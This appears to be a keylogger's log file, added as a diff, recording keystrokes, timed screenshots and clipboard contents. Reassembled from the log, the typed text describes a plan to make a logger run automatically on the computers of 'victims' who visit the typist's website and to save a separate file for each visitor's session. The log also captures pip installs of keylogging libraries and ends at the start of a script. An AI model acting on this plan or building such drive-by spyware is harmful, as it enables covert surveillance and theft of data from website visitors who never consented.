+[2026-11-04 23:02:53] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:02:53] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:53] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:02:53] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:02:53] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:53] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:53] INFO: KEY_PRESS: 's'
+[2026-11-04 23:02:54] INFO: KEY_PRESS: 't'
+[2026-11-04 23:02:54] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:54] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:02:54] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:54] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:02:54] INFO: KEY_PRESS: 'f'
+[2026-11-04 23:02:55] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:55] INFO: KEY_PRESS: 's'
+[2026-11-04 23:02:55] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:55] INFO: KEY_PRESS: 't'
+[2026-11-04 23:02:55] INFO: KEY_PRESS: 't'
+[2026-11-04 23:02:55] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:02:56] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:56] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:02:56] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:56] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:02:56] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:02:56] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:56] INFO: KEY_PRESS: 't'
+[2026-11-04 23:02:57] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230256.png
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:57] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 's'
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:57] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:02:57] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:58] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:02:58] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:02:58] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:02:58] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:58] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:02:58] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:58] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:02:59] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:59] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:02:59] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:59] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:02:59] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:02:59] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:59] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:59] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 't'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:03:00] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 't'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:03:00] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:03:27] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230327.png
+[2026-11-04 23:03:53] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:03:53] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:53] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:03:53] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:03:53] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:03:53] INFO: KEY_PRESS: 't'
+[2026-11-04 23:03:54] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:54] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:03:54] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:03:54] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:03:54] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:03:54] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:03:54] INFO: KEY_PRESS: 's'
+[2026-11-04 23:03:54] INFO: KEY_PRESS: 't'
+[2026-11-04 23:03:55] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:03:55] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:03:55] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:03:55] INFO: KEY_PRESS: ','
+[2026-11-04 23:03:55] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:55] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:03:55] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:03:56] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:56] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:03:56] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:03:57] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:03:57] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230357.png
+[2026-11-04 23:03:57] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:03:57] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:57] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:03:58] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:03:58] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:03:58] INFO: KEY_PRESS: 't'
+[2026-11-04 23:03:58] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:58] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:03:58] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:03:58] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:58] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:03:58] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 's'
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 't'
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:03:59] INFO: KEY_SPECIAL: space
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 't'
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:03:59] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:00] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:00] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:00] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:00] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:00] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:00] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:00] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:04:00] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:00] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:01] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:04:01] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:01] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:04:01] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:02] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:04:02] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:02] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:02] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:04:02] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:02] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:02] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:02] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:04:03] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:03] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:03] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:03] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:05] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:05] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:05] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:05] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:05] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:06] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:06] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:06] INFO: KEY_PRESS: '0'
+[2026-11-04 23:04:07] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:07] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:07] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:04:07] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:04:07] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:07] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:04:08] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:08] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:08] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:09] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:09] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:04:09] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:04:09] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:04:09] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:09] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:09] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:04:10] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:10] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:10] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:10] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:10] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:10] INFO: KEY_PRESS: 'j'
+[2026-11-04 23:04:10] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:04:10] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:10] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:11] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:11] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:11] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:11] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:11] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:04:11] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:11] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:11] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:11] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:12] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:12] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:12] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:04:12] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:12] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:13] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:13] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:13] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:13] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:13] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:14] INFO: KEY_PRESS: '''
+[2026-11-04 23:04:14] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:14] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:14] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:15] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:04:15] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:15] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:15] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:15] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:15] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:04:15] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:17] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:17] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:17] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:17] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:18] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:18] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:18] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:18] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:19] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:19] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:19] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:19] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:19] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:19] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:19] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:19] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:19] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:20] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:20] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:04:20] INFO: KEY_SPECIAL: delete
+[2026-11-04 23:04:21] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:04:21] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:21] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:21] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:21] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:21] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:04:22] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:22] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:22] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:04:22] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:22] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:22] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:22] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:23] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:23] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:04:23] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:04:23] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:23] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:23] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:23] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:23] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:24] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:24] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:24] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:24] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:04:24] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:24] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:24] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:04:24] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:24] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:25] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:27] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230427.png
+[2026-11-04 23:04:29] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:04:29] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:29] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:30] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:30] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:30] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:30] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:30] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:30] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:30] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:31] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:31] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:31] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:04:31] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:31] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:31] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:31] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:32] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:32] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:32] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:32] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:32] INFO: KEY_PRESS: 'x'
+[2026-11-04 23:04:32] INFO: KEY_PRESS: 't'
+[2026-11-04 23:04:32] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:33] INFO: KEY_PRESS: 'f'
+[2026-11-04 23:04:33] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:33] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:04:33] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:33] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:33] INFO: KEY_PRESS: 'f'
+[2026-11-04 23:04:33] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:33] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:33] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:04:34] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:34] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:35] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:35] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:36] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:04:36] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:36] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:04:37] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:37] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:37] INFO: KEY_PRESS: 'f'
+[2026-11-04 23:04:37] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:37] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:37] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:37] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:37] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:04:38] INFO: KEY_SPECIAL: space
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 's'
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:04:38] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:04:57] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230457.png
+[2026-11-04 23:05:27] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230527.png
+[2026-11-04 23:05:57] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230557.png
+[2026-11-04 23:06:27] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:06:27] INFO: KEY_PRESS: 'O'
+[2026-11-04 23:06:27] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230627.png
+[2026-11-04 23:06:27] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:06:28] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:06:28] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:06:28] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:28] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:06:28] INFO: KEY_PRESS: ';'
+[2026-11-04 23:06:28] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:06:28] INFO: KEY_PRESS: 't'
+[2026-11-04 23:06:28] INFO: KEY_PRESS: 's'
+[2026-11-04 23:06:28] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:29] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:06:29] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:06:29] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:29] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:06:29] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:06:30] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:06:30] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:06:30] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:06:30] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:06:31] INFO: KEY_PRESS: 't'
+[2026-11-04 23:06:31] INFO: KEY_PRESS: 's'
+[2026-11-04 23:06:31] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:32] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:06:32] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:06:32] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:32] INFO: KEY_PRESS: 't'
+[2026-11-04 23:06:32] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:06:32] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:06:32] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:06:32] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:06:32] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:06:33] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 't'
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:06:33] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:06:33] INFO: KEY_PRESS: 't'
+[2026-11-04 23:06:33] INFO: KEY_SPECIAL: space
+[2026-11-04 23:06:34] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:06:34] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:06:34] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:06:57] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230657.png
+[2026-11-04 23:07:27] INFO: CLIPBOARD_UPDATED: 'pip install pynput pyperclip'
+[2026-11-04 23:07:27] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230727.png
+[2026-11-04 23:07:35] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:07:35] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:07:35] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:07:38] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:07:38] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:07:38] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:07:38] INFO: KEY_PRESS: '3'
+[2026-11-04 23:07:38] INFO: KEY_SPECIAL: space
+[2026-11-04 23:07:39] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:07:39] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:07:40] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:41] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:42] INFO: KEY_SPECIAL: left
+[2026-11-04 23:07:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:07:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:07:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:07:44] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:07:44] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:07:58] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230757.png
+[2026-11-04 23:08:12] INFO: CLIPBOARD_UPDATED: 'pip install Flask pandas'
+[2026-11-04 23:08:15] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:08:15] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:08:15] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:16] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:17] INFO: KEY_SPECIAL: left
+[2026-11-04 23:08:18] INFO: KEY_PRESS: '3'
+[2026-11-04 23:08:19] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:08:28] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230828.png
+[2026-11-04 23:08:46] INFO: CLIPBOARD_UPDATED: 'import os
